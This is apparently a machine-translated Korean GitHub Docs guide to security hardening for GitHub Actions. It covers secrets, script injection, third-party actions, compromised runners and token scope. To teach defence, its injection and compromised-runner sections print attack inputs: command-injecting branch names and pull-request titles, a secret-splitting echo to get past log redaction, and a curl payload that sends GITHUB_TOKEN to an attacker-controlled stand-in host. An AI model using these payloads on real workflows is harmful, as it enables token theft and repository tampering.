---
title: GitHub Actions에 대한 보안 강화
shortTitle: Security hardening
intro: '{% data variables.product.prodname_actions %} 기능을 사용하는 적절한 보안 사례입니다.'
redirect_from:
  - /actions/getting-started-with-github-actions/security-hardening-for-github-actions
  - /actions/learn-github-actions/security-hardening-for-github-actions
versions:
  fpt: '*'
  ghes: '*'
  ghae: '*'
  ghec: '*'
type: overview
topics:
  - Security
miniTocMaxHeadingLevel: 3
ms.openlocfilehash: 0f93496361500083c23ef6f5095a785855246503
ms.sourcegitcommit: b617c4a7a1e4bf2de3987a86e0eb217d7031490f
ms.translationtype: MT
ms.contentlocale: ko-KR
ms.lasthandoff: 11/11/2022
ms.locfileid: '148161217'
---
{% data reusables.actions.enterprise-beta %} {% data reusables.actions.enterprise-github-hosted-runners %}

## 개요

이 가이드에서는 특정 {% data variables.product.prodname_actions %} 기능에 대한 보안 강화를 구성하는 방법을 설명합니다. {% data variables.product.prodname_actions %} 개념이 익숙하지 않은 경우 “[GitHub Actions 핵심 개념](/actions/getting-started-with-github-actions/core-concepts-for-github-actions)”을 참조하세요.

## 비밀 사용

중요한 값은 워크플로 파일에 일반 텍스트로 저장하지 말아야 하며 비밀로 저장하는 것이 좋습니다. [비밀](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets)은 조직, 리포지토리 또는 환경 수준에서 구성할 수 있으며 {% data variables.product.product_name %}에 중요한 정보를 저장할 수 있습니다.

비밀은 [은 Libsodium 봉인 상자](https://libsodium.gitbook.io/doc/public-key_cryptography/sealed_boxes)를 사용하므로 {% data variables.product.product_name %}에 도달하기 전에 암호화됩니다. 이는 [UI를 사용](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets#creating-encrypted-secrets-for-a-repository)하거나 [REST API](/rest/reference/actions#secrets)를 통해 비밀을 제출할 때 발생합니다. 이 클라이언트 쪽 암호화는 {% data variables.product.product_name %}의 인프라 내에서 실수로 인한 로깅(예: 예외 로그 및 요청 로그 등)과 관련된 위험을 최소화하는 데 도움이 됩니다. 비밀이 업로드되면 {% data variables.product.product_name %}에서 암호를 해독하여 워크플로 런타임에 삽입할 수 있습니다.

실수로 인한 공개를 방지하기 위해 {% data variables.product.product_name %}는 실행 로그에 표시되는 비밀을 수정하는 메커니즘을 사용합니다. 이 편집은 Base64와 같은 값의 일반적인 인코딩뿐만 아니라 구성된 비밀의 정확한 일치 항목을 찾습니다. 그러나 비밀 값을 변환할 수 있는 여러 가지 방법이 있기 때문에 이 수정이 보장되지는 않습니다. 따라서 비밀이 수정되도록 하고 비밀과 관련된 다른 위험을 제한하기 위해 따라야 하는 특정 사전 단계와 모범 사례가 있습니다.

- **정형 데이터를 비밀로 사용하지 마세요.**
    - 정형 데이터로 인해 로그 내에서 비밀 편집이 실패할 수 있습니다. 편집은 주로 특정 비밀 값에 대한 정확한 일치 항목을 찾는 데 의존하기 때문입니다. BLOB예를 들어 JSON, XML 또는 YAML(또는 이와 유사한) BLOB을 사용하여 비밀 값을 캡슐화하지 마세요. 이렇게 하면 비밀이 제대로 수정될 확률이 크게 줄어듭니다. 대신 각 중요한 값에 대한 개별 비밀을 만듭니다.
- **워크플로 내에서 사용되는 모든 비밀 등록**
    - 워크플로 내에서 다른 중요한 값을 생성하는 데 비밀을 사용하는 경우 생성된 값은 로그에 표시되는 경우 수정되도록 공식적으로 [비밀로 등록](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret)되어야 합니다. 예를 들어 프라이빗 키를 사용하여 서명된 JWT를 생성하여 웹 API에 액세스하는 경우 해당 JWT를 비밀로 등록해야 합니다. 그렇지 않으면 로그 출력에 들어가면 수정되지 않습니다.
    - 비밀 등록은 모든 종류의 변환/인코딩에도 적용됩니다. 비밀이 어떤 방식으로든 변환되는 경우(예: Base64 또는 URL 인코딩) 새 값도 비밀로 등록해야 합니다.
- **비밀 처리 방법 감사**
    - 비밀이 예상대로 처리되고 있는지 확인하기 위해 비밀이 사용되는 방법을 감사합니다. 워크플로를 실행하는 리포지토리의 소스 코드를 검토하고 워크플로에 사용된 작업을 확인하여 이 작업을 수행할 수 있습니다. 예를 들어 의도하지 않은 호스트로 보내지거나 로그 출력에 명시적으로 인쇄되지 않는지 확인합니다.
    - 유효한 입력 및 유효하지 않은 입력을 테스트한 후 워크플로에 대한 실행 로그를 보고 비밀이 제대로 수정되었거나 표시되지 않는지 확인합니다. 호출하는 명령 또는 도구가 `STDOUT` 및 `STDERR`에 오류를 보내고 비밀이 이후에 오류 로그로 끝날 수 있는 방법이 항상 명확하지는 않습니다. 따라서 유효한 입력 및 유효하지 않은 입력을 테스트한 후 워크플로 로그를 수동으로 검토하는 것이 좋습니다.
- **최소 범위의 자격 증명 사용**
    - 워크플로 내에서 사용되는 자격 증명에 필요한 최소 권한이 있는지 확인하고, 리포지토리에 대한 쓰기 액세스가 있는 모든 사용자에게 리포지토리에 구성된 모든 비밀에 대한 읽기 액세스가 있음을 염두에 두어야 합니다. 
    - 작업은 `GITHUB_TOKEN` 컨텍스트에서 액세스하여 `github.token`을 사용할 수 있습니다. 자세한 내용은 “[컨텍스트](/actions/learn-github-actions/contexts#github-context)”를 참조하세요. 따라서 `GITHUB_TOKEN`에 필요한 최소 사용 권한이 부여되었는지 확인해야 합니다. `GITHUB_TOKEN`에 리포지토리 콘텐츠에 대해서만 읽기 액세스를 갖는 기본 권한을 설정하는 것이 좋습니다. 그런 다음 필요에 따라 워크플로 파일 내의 개별 작업에 대한 권한을 늘릴 수 있습니다. 자세한 내용은 “[워크플로의 인증](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token)”을 참조하세요. 
- **등록된 비밀 감사 및 회전**
    - 등록된 비밀을 주기적으로 검토하여 여전히 필요한지 확인합니다. 더 이상 필요하지 않은 엔드포인트는 제거합니다.
    - 비밀을 주기적으로 회전하여 손상된 비밀이 유효한 기간을 줄입니다.
- **비밀 액세스에 대한 검토 요구 고려**
    - 필요한 검토자를 사용하여 환경 비밀을 보호할 수 있습니다. 즉, 검토자가 승인할 때까지 워크플로 작업이 환경 비밀에 액세스할 수 없습니다. 환경에 비밀을 저장하거나 환경에 대한 검토를 요구하는 방법에 대한 자세한 내용은 “[암호화된 비밀](/actions/reference/encrypted-secrets)” 및 “[배포를 위한 환경 사용](/actions/deployment/using-environments-for-deployment)”을 참조하세요.

{% warning %}

**경고**: 리포지토리에 대한 쓰기 권한이 있는 모든 사용자는 리포지토리에 구성된 모든 비밀에 대한 읽기 액세스 권한을 갖습니다. 따라서 워크플로 내에서 사용되는 자격 증명에 필요한 최소 권한이 있는지 확인해야 합니다.

{% endwarning %}

## 변경 내용을 모니터링하는 데 `CODEOWNERS` 사용

`CODEOWNERS` 기능을 사용하여 워크플로 파일을 변경하는 방법을 제어할 수 있습니다. 예를 들어 `.github/workflows`에 모든 워크플로 파일이 저장되어 있는 경우 이 디렉터리를 코드 소유자 목록에 추가할 수 있으므로 해당 파일에 대한 제안된 변경 내용은 먼저 지정된 검토자의 승인이 필요합니다.

자세한 내용은 “[코드 사용자 정보](/github/creating-cloning-and-archiving-repositories/about-code-owners)”를 참조하세요.

## 스크립트 삽입의 위험 이해

워크플로, [사용자 지정 작업](/actions/creating-actions/about-actions) 및 [복합 작업](/actions/creating-actions/creating-a-composite-action) 작업을 만들 때 코드가 공격자의 신뢰할 수 없는 입력을 실행할 수 있는지 항상 고려해야 합니다. 이는 공격자가 악의적인 명령과 스크립트를 컨텍스트에 추가할 때 발생할 수 있습니다. 워크플로가 실행되면 해당 문자열이 실행기에서 실행되는 코드로 해석될 수 있습니다.

 공격자는 잠재적으로 신뢰할 수 없는 입력으로 처리되어야 하는 [`github`컨텍스트](/actions/reference/context-and-expression-syntax-for-github-actions#github-context)에 자신의 악성 콘텐츠를 추가할 수 있습니다. 해당 컨텍스트는 일반적으로 `body`, `default_branch`, `email`, `head_ref`, `label`, `message`, `name`, `page_name`, `ref` 및 `title`로 끝납니다.  예를 들면 `github.event.issue.title` 또는 `github.event.pull_request.body`입니다.

 값이 워크플로, 작업, API 호출 또는 실행 코드로 해석될 수 있는 다른 위치로 직접 전달되지 않도록 해야 합니다. 다른 권한 있는 애플리케이션 코드에 사용하는 것과 동일한 방어 프로그래밍 상태를 채택하면 보안이 {% data variables.product.prodname_actions %}의 사용을 강화하는 데 도움이 될 수 있습니다. 공격자가 수행할 수 있는 몇 가지 단계에 대한 자세한 내용은 [“손상된 실행기의 잠재적 영향](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner)”을 참조하세요.

또한 분기 이름 및 메일 주소와 같이 잠재적으로 신뢰할 수 없는 입력의 기타 불분명한 원본이 있으며 이는 허용된 콘텐츠 측면에서 매우 유연할 수 있습니다. 예를 들어 `zzz";echo${IFS}"hello";#`는 유효한 분기 이름이고 대상 리포지토리에 대한 가능한 공격 벡터입니다.

다음 섹션에서는 스크립트 삽입의 위험을 완화하는 방법을 설명합니다.

### 스크립트 삽입 공격의 예

스크립트 삽입 공격은 워크플로의 인라인 스크립트 내에서 직접 발생할 수 있습니다. 다음 예제에서 작업은 식을 사용하여 끌어오기 요청 제목의 유효성을 테스트하지만 스크립트 삽입의 위험도 추가합니다.

{% raw %}
```
      - name: Check PR title
        run: |
          title="${{ github.event.pull_request.title }}"
          if [[ $title =~ ^octocat ]]; then
          echo "PR title starts with 'octocat'"
          exit 0
          else
          echo "PR title did not start with 'octocat'"
          exit 1
          fi
```
{% endraw %}

이 예제는 `run` 명령이 실행기에서 임시 셸 스크립트 내에서 실행되므로 스크립트 삽입에 취약합니다. 셸 스크립트를 실행하기 전에 {% raw %}`${{ }}`{% endraw %} 내의 식이 평가된 다음 결과 값으로 대체되어 셸 명령 삽입에 취약할 수 있습니다.

이 워크플로에 명령을 삽입하기 위해 공격자는 다음과 같이 `a"; ls $GITHUB_WORKSPACE"`라는 제목으로 끌어오기 요청을 만들 수 있습니다.

![PR 제목의 스크립트 삽입 예제](/assets/images/help/images/example-script-injection-pr-title.png)

이 예제에서 `"` 문자는 {% raw %}`title="${{ github.event.pull_request.title }}"`{% endraw %} 문을 중단하여 실행기에서 `ls` 명령을 실행할 수 있도록 하는 데 사용됩니다. 로그에서 `ls` 명령의 출력을 볼 수 있습니다.

![스크립트 삽입의 예제 결과](/assets/images/help/images/example-script-injection-result.png)

## 스크립트 삽입 공격을 완화하기 위한 모범 사례

스크립트 삽입의 위험을 완화하는 데 사용할 수 있는 다양한 방법이 있습니다.

### 인라인 스크립트 대신 작업 사용(권장)

컨텍스트 값을 인수로 처리하는 작업을 만드는 것이 좋습니다. 컨텍스트 값은 셸 스크립트를 생성하는 데 사용되지 않고 대신 작업에 인수로 전달되므로 이 방법은 삽입 공격에 취약하지 않습니다.

{% raw %}
```
uses: fakeaction/checktitle@v3
with:
    title: ${{ github.event.pull_request.title }}
```
{% endraw %}

### 중간 환경 변수 사용

인라인 스크립트의 경우 신뢰할 수 없는 입력을 처리하는 기본 방법은 식 값을 중간 환경 변수로 설정하는 것입니다.

다음 예제에서는 Bash를 사용하여 `github.event.pull_request.title` 값을 환경 변수로 처리합니다.

{% raw %}
```
      - name: Check PR title
        env:
          TITLE: ${{ github.event.pull_request.title }}
        run: |
          if [[ "$TITLE" =~ ^octocat ]]; then
          echo "PR title starts with 'octocat'"
          exit 0
          else
          echo "PR title did not start with 'octocat'"
          exit 1
          fi
```
{% endraw %}

이 예제에서 시도한 스크립트 삽입은 실패합니다.

![완화된 스크립트 삽입의 예](/assets/images/help/images/example-script-injection-mitigated.png)

이 방법을 사용하면 {% raw %}`${{ github.event.issue.title }}`{% endraw %} 식의 값이 메모리에 저장되고 변수로 사용되며 스크립트 생성 프로세스와 상호 작용하지 않습니다. 또한 [단어 분할](https://github.com/koalaman/shellcheck/wiki/SC2086)을 방지하기 위해 큰따옴표 셸 변수를 사용하는 것이 좋지만 이는 셸 스크립트를 작성하기 위한 일반적인 권장 사항 [중 하나이며](https://mywiki.wooledge.org/BashPitfalls) {% data variables.product.prodname_actions %}에 한정되지 않습니다.

{% ifversion fpt or ghec %}
### 코드 검사에 시작 워크플로 사용

{% data reusables.advanced-security.starter-workflows-beta %} {% data variables.product.prodname_code_scanning_capc %}을 사용하면 프로덕션 환경에 도달하기 전에 보안 취약성을 찾을 수 있습니다. {% data variables.product.product_name %}는 {% data variables.product.prodname_code_scanning %}에 대한 시작 워크플로를 제공합니다. 처음부터 시작하는 대신 제안된 워크플로를 사용하여 {% data variables.product.prodname_code_scanning %} 워크플로를 구성할 수 있습니다. {% data variables.product.company_short%}의 워크플로인 {% data variables.code-scanning.codeql_workflow %}는 {% data variables.product.prodname_codeql %}에서 구동됩니다. 타사 시작 워크플로도 사용할 수 있습니다.

자세한 내용은 “[{% data variables.product.prodname_code_scanning %} 정보](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/about-code-scanning)” 및 “[시작 워크플로를 사용하여 {% data variables.product.prodname_code_scanning %} 설정](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/setting-up-code-scanning-for-a-repository#setting-up-code-scanning-using-starter-workflows)”을 참조하세요.

{% endif %}

### 토큰에 대한 권한 제한

노출된 토큰의 위험을 완화하려면 할당된 권한을 제한하는 것이 좋습니다. 자세한 내용은 “[GITHUB_TOKEN에 대한 권한 수정](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token)”을 참조하세요.

{% ifversion fpt or ghec or ghes > 3.4 %}

## OpenID Connect를 사용하여 클라우드 리소스에 액세스

{% data reusables.actions.about-oidc-short-overview %}

{% endif %}

## 타사 작업 사용

워크플로의 개별 작업은 다른 작업과 상호 작용하고 손상시킬 수 있습니다. 예를 들어, 이후 작업에서 사용하는 환경 변수를 쿼리하거나, 이후 작업에서 처리하는 공유 디렉터리에 파일을 쓰거나, Docker 소켓과 상호 작용하고 실행 중인 다른 컨테이너를 검사하고 명령을 실행하여 더욱 직접적으로 작업합니다.

즉, 손상된 작업이 리포지토리에 구성된 모든 비밀에 액세스할 수 있고 리포지토리에 쓰는 데 `GITHUB_TOKEN`을 사용할 수 있기 때문에 워크플로 내에서 단일 작업의 손상이 매우 중요할 수 있습니다. 따라서 {% data variables.product.prodname_dotcom %}의 타사 리포지토리에서 작업을 소싱할 때 상당한 위험이 있습니다. 공격자가 수행할 수 있는 몇 가지 단계에 대한 자세한 내용은 [“손상된 실행기의 잠재적 영향](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner)”을 참조하세요.

다음 모범 사례를 따라하여 이 위험을 완화할 수 있습니다.

* **전체 길이 커밋 SHA에 작업 고정**

  작업을 전체 길이 커밋 SHA에 고정하는 것은 현재 변경할 수 없는 릴리스로 작업을 사용하는 유일한 방법입니다. 특정 SHA에 고정하면 유효한 Git 개체 페이로드에 대한 SHA-1 충돌을 생성해야 하므로 잘못된 행위자가 작업 리포지토리에 백도어를 추가하는 위험을 완화할 수 있습니다.

* **작업의 소스 코드 감사**

  작업이 리포지토리의 콘텐츠 및 비밀을 예상대로 처리하는지 확인합니다. 예를 들어 비밀이 의도하지 않은 호스트로 전송되거나 실수로 기록되지 않는지 확인합니다.

* **작성자를 신뢰하는 경우에만 태그에 작업 고정**

  커밋 SHA에 고정하는 것이 가장 안전한 옵션이지만 태그를 지정하는 것이 더 편리하며 널리 사용됩니다. 태그를 지정하려면 작업의 작성자를 신뢰해야 합니다. {% data variables.product.prodname_marketplace %}의 ‘확인된 작성자’ 배지는 {% data variables.product.prodname_dotcom %}가 ID를 확인한 팀에서 작업을 작성했음을 나타내는 유용한 신호입니다. 잘못된 행위자가 작업을 저장하는 리포지토리에 대한 액세스 권한을 얻게 되면 태그를 이동하거나 삭제할 수 있으므로 작성자를 신뢰하더라도 이 접근 방식에는 위험이 있습니다.

{% ifversion fpt or ghes > 3.3 or ghae > 3.3 or ghec %}
## 타사 워크플로 다시 사용

타사 작업 사용에 대해 위에서 설명한 것과 동일한 원칙이 타사 워크플로 사용에도 적용됩니다. 위에서 설명한 것과 동일한 모범 사례를 따라하여 워크플로 재사용과 관련된 위험을 완화할 수 있습니다. 자세한 내용은 “[워크플로 다시 사용](/actions/learn-github-actions/reusing-workflows)”을 참조하세요.
{% endif %}

{% ifversion internal-actions %}
## 워크플로가 내부 리포지토리에 액세스하도록 허용

{% data reusables.actions.outside-collaborators-internal-actions %} 자세한 내용은 “[엔터프라이즈와 작업 및 워크플로 공유](/actions/creating-actions/sharing-actions-and-workflows-with-your-enterprise)”를 참조하세요.
{% endif %}

{% ifversion allow-actions-to-approve-pr %}
## {% data variables.product.prodname_actions %}가 끌어오기 요청을 {% ifversion allow-actions-to-approve-pr-with-ent-repo %}만들거나 {% endif %}승인하는 것 방지

{% data reusables.actions.workflow-pr-approval-permissions-intro %} 워크플로 또는 기타 자동화를 허용하면 끌어오기 요청이 적절한 감독 없이 병합될 경우 {% ifversion allow-actions-to-approve-pr-with-ent-repo %}만들기 또는 {% endif %}끌어오기 요청 승인이 보안 위험이 될 수 있습니다.

이 설정을 구성하는 방법에 대한 자세한 내용은 {% ifversion allow-actions-to-approve-pr-with-ent-repo %}{% ifversion ghes or ghec or ghae %}“[엔터프라이즈의 {% data variables.product.prodname_actions %}에 대한 정책 적용](/enterprise-cloud@latest/admin/policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise#preventing-github-actions-from-creating-or-approving-pull-requests)”,{% endif %}{% endif %} “[조직의 {% data variables.product.prodname_actions %} 비활성화 또는 제한](/github/setting-up-and-managing-organizations-and-teams/disabling-or-limiting-github-actions-for-your-organization#preventing-github-actions-from-{% ifversion allow-actions-to-approve-pr-with-ent-repo %}creating-or-{% endif %}approving-pull-requests)”{% ifversion allow-actions-to-approve-pr-with-ent-repo %} 및 “[ 리포지토리에 대한 {% data variables.product.prodname_actions %} 설정 관리](/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#preventing-github-actions-from-creating-or-approving-pull-requests)”{% endif %}를 참조하세요.
{% endif %}

## OpenSSF 성과 기록표를 사용하여 워크플로 보호

[성과 기록표](https://github.com/ossf/scorecard)는 위험한 공급망 사례를 표시하는 자동화된 보안 도구입니다. [성과 기록표 작업](https://github.com/marketplace/actions/ossf-scorecard-action) 및 [시작 워크플로](https://github.com/actions/starter-workflows)를 사용하여 모범 보안 사례를 따라할 수 있습니다. 성과 기록표 작업은 구성되면 리포지토리 변경 시 자동으로 실행되며 기본 제공 코드 검사 환경을 사용하여 위험한 공급망 사례에 대해 개발자에게 경고합니다. 성과 기록표 프로젝트는 스크립트 삽입 공격, 토큰 사용 권한 및 고정된 작업을 비롯한 다양한 검사를 실행합니다.

## 손상된 실행기의 잠재적 영향

이 섹션에서는 공격자가 {% data variables.product.prodname_actions %} 실행기에서 악의적인 명령을 실행할 수 있는 경우 수행할 수 있는 몇 가지 단계를 고려합니다.

{% note %}

**참고:** {% data variables.product.prodname_dotcom %}호스팅 실행기는 손상된 타사 라이브러리와 같이 작업 중에 사용자가 다운로드한 악성 코드를 검사하지 않습니다.

{% endnote %}

### 비밀에 액세스

`pull_request` 이벤트를 사용하여 트리거되는 워크플로에는 읽기 전용 권한이 있으며 비밀에 액세스할 수 없습니다. 그러나 사용 권한은 공격자가 리포지토리 비밀을 도용하거나 작업의 [`GITHUB_TOKEN`](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token)의 쓰기 권한을 사용하려고 시도할 수 있는 `issue_comment`, `issues` 및 `push`와 같은 다양한 이벤트 트리거와 다릅니다.

- 비밀 또는 토큰이 환경 변수로 설정된 경우 `printenv`를 사용하여 환경을 통해 직접 액세스할 수 있습니다.
- 비밀이 식에서 직접 사용되는 경우 생성된 셸 스크립트는 디스크에 저장되고 액세스할 수 있습니다.
- 사용자 지정 작업의 경우 프로그램이 인수에서 얻은 비밀을 사용하는 방법에 따라 위험이 달라질 수 있습니다.

  {% raw %}
  ```
  uses: fakeaction/publish@v3
  with:
      key: ${{ secrets.PUBLISH_KEY }}
  ```
  {% endraw %}

{% data variables.product.prodname_actions %}은 워크플로(또는 포함된 작업)에서 참조되지 않은 메모리에서 비밀을 스크럽하지만 확인된 공격자가 `GITHUB_TOKEN` 및 참조된 비밀을 수집할 수 있습니다.

### 실행기에서 데이터 유출

공격자는 실행기에서 도난당한 비밀 또는 기타 데이터를 유출할 수 있습니다. 실수로 인한 비밀 공개를 방지하기 위해 {% data variables.product.prodname_actions %}은 [로그에 인쇄된 비밀을 자동으로 수정](/actions/reference/encrypted-secrets#accessing-your-secrets)하지만 비밀이 의도적으로 로그로 전송될 수 있으므로 이는 진정한 보안 경계가 아닙니다. 예를 들어 난독 처리된 비밀은 `echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};`을 사용하여 유출할 수 있습니다. 또한 공격자가 임의의 명령을 실행할 수 있으므로 HTTP 요청을 사용하여 비밀 또는 기타 리포지토리 데이터를 외부 서버로 보낼 수 있습니다.

### 작업의 `GITHUB_TOKEN` 도용

공격자가 작업의 `GITHUB_TOKEN`을 도용할 수 있습니다. {% data variables.product.prodname_actions %} 실행기는 워크플로가 포함된 리포지토리로만 제한되는 권한으로 생성된 `GITHUB_TOKEN`을 자동으로 수신하며, 작업이 완료된 후 토큰이 만료됩니다. 토큰은 만료되면 공격자에게 더 이상 유용하지 않습니다. 제한을 해결하기 위해 예를 들어 `a"; set +e; curl http://example.com?token=$GITHUB_TOKEN;#`와 같은 토큰을 사용하여 공격자 제어 서버를 호출하여 공격을 자동화하고 1초 단위로 수행할 수 있습니다.

### 리포지토리의 콘텐츠 수정

공격자 서버는 `GITHUB_TOKEN`의 할당된 권한이 [제한되지 않은 경우](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token) {% ifversion fpt or ghec %}{% data variables.product.prodname_dotcom %}{% else %}{% data variables.product.product_name %}{% endif %} API를 사용하여 릴리스를 포함한 [리포지토리 콘텐츠를 수정](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token)할 수 있습니다.

## 리포지토리 간 액세스 고려

{% data variables.product.prodname_actions %}은 한 번에 하나의 리포지토리에 대해 의도적으로 범위가 지정됩니다. 모든 쓰기 액세스 사용자가 워크플로 파일을 만들거나 수정하거나, 필요한 경우 `GITHUB_TOKEN`의 사용 권한을 승격하여 `GITHUB_TOKEN`에 액세스할 수 있으므로 이 토큰은 쓰기 액세스 사용자와 동일한 수준의 액세스 권한을 부여합니다. 사용자는 각 리포지토리에 대해 특정 권한을 가지므로 한 리포지토리에 대한 `GITHUB_TOKEN`에 다른 리포지토리에 대한 액세스 권한을 부여하도록 허용 하면 신중하게 구현되지 않은 경우 {% data variables.product.prodname_dotcom %} 권한 모델에 영향을 줄 수 있습니다. 마찬가지로 워크플로에 {% data variables.product.prodname_dotcom %} 인증 토큰을 추가할 때는 주의해야 합니다. 이는 공동 작업자에게 광범위한 액세스 권한을 실수로 부여하여 {% data variables.product.prodname_dotcom %} 권한 모델에도 영향을 줄 수 있기 때문입니다.

[{% data variables.product.prodname_dotcom %} 로드맵에 대한 계획](https://github.com/github/roadmap/issues/74)은 {% data variables.product.product_name %} 내에서 리포지토리 간 액세스를 허용하는 흐름을 지원하지만 아직 지원되는 기능은 아닙니다. 현재 권한 있는 리포지토리 간 상호 작용을 수행하는 유일한 방법은 {% data variables.product.prodname_dotcom %} 인증 토큰 또는 SSH 키를 워크플로 내에서 비밀로 배치하는 것입니다. 많은 인증 토큰 유형은 특정 리소스에 대한 세분화된 액세스를 허용하지 않기 때문에 의도한 것보다 훨씬 광범위한 액세스 권한을 부여할 수 있으므로 잘못된 토큰 형식을 사용할 때 상당한 위험이 있습니다.

이 목록에서는 워크플로 내에서 기본 설정의 내림차순으로 리포지토리 데이터에 액세스하는 데 권장되는 방법을 설명합니다.

1. **`GITHUB_TOKEN`**
    -  이 토큰은 의도적으로 워크플로를 호출한 단일 리포지토리로 범위가 지정되며 리포지토리의 쓰기 액세스 사용자와 동일한 수준의 액세스 권한을 가질 수 있습니다. 토큰은 각 작업이 시작되기 전에 만들어지고 작업이 완료되면 만료됩니다. 자세한 내용은 “[GITHUB_TOKEN을 사용한 인증](/actions/configuring-and-managing-workflows/authenticating-with-the-github_token)”을 참조하세요.
    - `GITHUB_TOKEN`은 가능할 때마다 사용되어야 합니다.
2. **리포지토리 배포 키**
    - 배포 키는 단일 리포지토리에 대한 읽기 또는 쓰기 액세스 권한을 부여하는 유일한 자격 증명 유형 중 하나이며 워크플로 내에서 다른 리포지토리와 상호 작용하는 데 사용할 수 있습니다. 자세한 내용은 “[배포 키 관리](/developers/overview/managing-deploy-keys#deploy-keys)”를 참조하세요.
    - 배포 키는 Git을 사용하여 리포지토리에만 복제하고 푸시할 수 있으며 REST 또는 GraphQL API와 상호 작용하는 데 사용할 수 없으므로 요구 사항에 적합하지 않을 수 있습니다.
3. **{% data variables.product.prodname_github_app %} 토큰**
    - {% data variables.product.prodname_github_apps %}은 선택 리포지토리에 설치할 수 있으며 해당 리포지토리 내의 리소스에 대한 세분화된 권한을 가질 수도 있습니다. 조직 내부 {% data variables.product.prodname_github_app %}을 만들고, 워크플로 내에서 액세스해야 하는 리포지토리에 설치하고, 워크플로 내에서 설치로 인증하여 해당 리포지토리에 액세스할 수 있습니다.
4. **{% data variables.product.pat_generic %}s**
    - {% data variables.product.pat_v1 %}을(를) 사용하면 안 됩니다. 토큰은 액세스 권한이 있는 조직 내의 모든 리포지토리와 개인 계정의 모든 개인 리포지토리에 대한 액세스 권한을 부여합니다. 이렇게 하면 워크플로가 있는 리포지토리의 모든 쓰기 액세스 사용자에게 간접적으로 광범위한 액세스 권한이 부여됩니다.
    - {% data variables.product.pat_generic %}을(를) 사용하는 경우 자신의 계정에서 {% data variables.product.pat_generic %}을(를) 사용하면 안 됩니다. 나중에 조직을 떠날 경우 이 토큰을 사용하는 워크플로가 즉시 중단되고 이 문제를 디버깅하는 것이 어려울 수 있습니다. 대신 조직에 속하고 워크플로에 필요한 특정 리포지토리에 대한 액세스 권한만 부여되는 새 계정에 대해 {% ifversion pat-v2%}{% data variables.product.pat_v2 %}s{% else %}{% data variables.product.pat_generic %}s{% endif %}을(를) 사용해야 합니다. 이 방법은 확장할 수 없으며 배포 키와 같은 대안을 선호하지 않아야 합니다.
5. **개인 계정의 SSH 키**
    - 워크플로는 개인 계정에서 SSH 키를 사용하지 않아야 합니다. {% data variables.product.pat_v1_plural %}와 마찬가지로 모든 개인 리포지토리와 조직 멤버 자격을 통해 액세스할 수 있는 모든 리포지토리에 읽기/쓰기 권한을 부여합니다.  이렇게 하면 워크플로가 있는 리포지토리의 모든 쓰기 액세스 사용자에게 간접적으로 광범위한 액세스 권한이 부여됩니다. 리포지토리 복제 또는 푸시만 수행해야 하고 공용 API와 상호 작용할 필요가 없어서 SSH 키를 사용하려는 경우 개별 배포 키를 대신 사용해야 합니다.

## 자체 호스팅 실행기를 위한 강화

{% ifversion fpt or ghec %} **{% data variables.product.prodname_dotcom %}호스팅** 실행기는 임시 완전 격리된 가상 머신 내에서 코드를 실행합니다. 즉, 이 환경을 영구적으로 손상시키거나 부트스트랩 프로세스 중에 이 환경에 배치된 것보다 더 많은 정보에 액세스할 수 있는 방법이 없습니다.
{% endif %}

{% data variables.product.product_name %}에 대한 {% ifversion fpt or ghec %}**자체 호스팅**{% elsif ghes or ghae %}자체 호스팅{% endif %} 실행기는 임시 완전 가상 머신에서 실행되는 것을 보장하지 않으며 워크플로에서 신뢰할 수 없는 코드로 인해 지속적으로 손상될 수 있습니다.

{% ifversion fpt or ghec %} 따라서 사용자가 리포지토리에 대한 끌어오기 요청을 열고 환경을 손상시킬 수 있으므로 자체 호스팅 실행기는 {% data variables.product.product_name %}의 [퍼블릭 리포지토리에 거의 사용되지 않아야](/actions/hosting-your-own-runners/about-self-hosted-runners#self-hosted-runner-security) 합니다. 마찬가지로,{% elsif ghes or ghae %} {% endif %}리포지토리를 포크하고 끌어오기 요청을 열 수 있는 사람(일반적으로 리포지토리에 대한 읽기 액세스 권한이 있는 사용자)은 비밀 및 `GITHUB_TOKEN`에 대한 액세스 권한을 얻는 것을 포함하여, 설정에 따라 리포지토리에 대한 쓰기 권한을 부여할 수 있는 자체 호스팅 실행기 환경을 손상시킬 수 있으므로 프라이빗 또는 내부 리포지토리에서 자체 호스팅 실행기를 사용할 때 주의해야 합니다. 워크플로는 환경 및 필수 검토를 사용하여 환경 비밀에 대한 액세스를 제어할 수 있지만 워크플로는 격리된 환경에서 실행되지 않으며 자체 호스팅 실행기에서 실행될 때 동일한 위험에 여전히 취약합니다.

조직 또는 엔터프라이즈 수준에서 자체 호스팅 실행기를 정의하면 {% data variables.product.product_name %}는 여러 리포지토리에서 동일한 실행기로 워크플로를 예약할 수 있습니다. 따라서 환경의 보안 손상으로 인해 광범위한 영향을 미칠 수 있습니다. 손상 범위를 줄이기 위해 자체 호스팅 실행기를 별도의 그룹으로 구성하여 경계를 만들 수 있습니다. 실행기 그룹에 액세스할 수 있는 {% ifversion restrict-groups-to-workflows %}워크플로, {% endif %}조직 및 리포지토리를 제한할 수 있습니다. 자세한 내용은 “[그룹을 사용하여 자체 호스팅 실행기에 대한 액세스 관리](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups)”를 참조하세요.

자체 호스팅 실행기 머신의 환경도 고려해야 합니다.
- 자체 호스팅 실행기로 구성된 컴퓨터에 있는 중요한 정보는 무엇인가요? 예를 들어 프라이빗 SSH 키, API 액세스 토큰 등이 있습니다.
